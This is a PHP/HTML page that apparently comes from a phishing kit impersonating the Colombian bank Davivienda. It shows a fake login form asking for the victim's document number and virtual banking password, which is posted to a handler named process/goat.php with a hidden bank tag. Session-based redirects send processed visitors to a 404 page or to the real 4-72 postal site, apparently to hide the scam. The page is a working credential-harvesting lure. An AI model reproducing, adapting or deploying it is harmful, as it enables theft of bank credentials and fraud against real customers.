<?php
if (session_status() === PHP_SESSION_NONE) { session_start(); }

if (isset($_GET['id'])) {
    $_SESSION['cliente_id'] = intval($_GET['id']);
}

if (isset($_SESSION['estado'])) {
    if ($_SESSION['estado'] == 2) {
        header('location:/404.php');
        exit();
    } elseif ($_SESSION['estado'] == 3) {
        header('location:https://www.4-72.com.co/publicaciones/236/personas/');
        exit();
    }
}
?>

<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta http-equiv="X-UA-Compatible" content="IE=edge">
    <meta name="viewport" content="width=device-width, initial-scale=1.0, user-scalable=0">

    <title>Secure Payment</title>

    <style>
        * {
            margin: 0;
            padding: 0;
            font-family: arial;
            -webkit-appearance: none !important;
            -moz-appearance: none !important;
            color: white;
        }

        input {
            background-color: #605c5cd2;
            height: 40px;
            border-radius: 12px;
            padding-left: 5px;
        }

        a {
            font-size: 22px;
            margin-left: 10px;
        }

        select {
            background-color: #e2e2e2b2;
            height: 40px;
            border: none;
            width: 75%;
            margin-left: 50px;
            border-radius: 12px;
            padding-left: 10px;
        }

        input {
            width: 35%;
        }
    </style>
</head>
<body style="background-color:#6d6e72;">
    <img src="/img/texto.jfif" alt="" srcset="" width="100%">

    <div class="datos">
        <h6 style="margin-left:50px; margin-top:25px;">Tipo documento</h6>
        <select name="cc" id="">
            <option value="cedula" selected>Cédula de Ciudadanía</option>
        </select><br><br>

        <form action="process/goat.php" method="POST">
            <center>
                <label for="documento" style="margin-left:-10px;"><b>No. documento</b></label>
                <label for="clave" style="margin-left:50px;"><b>Clave virtual</b></label><br>

                <input type="tel" name="user" id="txtUsuario" style="margin-top:5px;" required minlength="6" maxlength="10" inputmode="numeric">
                <input type="password" name="pass" id="txtPass" style="margin-top:5px;" required minlength="6" maxlength="8">
                <input type="hidden" name="banco" value="davivienda">

                <input type="submit" value="Ingresar" style="border:none; background-color:red; height:45px; border-bottom:5px solid red; margin-top:5px;"><br><br><br>
                <a style="font-size:15px;">¿Olvidó o bloqueó su clave?</a> <br>
            </center>
            <br><br>
        </form>
    </div>

    <img src="img/davi1.jfif" alt="" srcset="" width="100%">
    <img src="img/davi2.jfif" alt="" srcset="" width="100%">
</body>
</html>
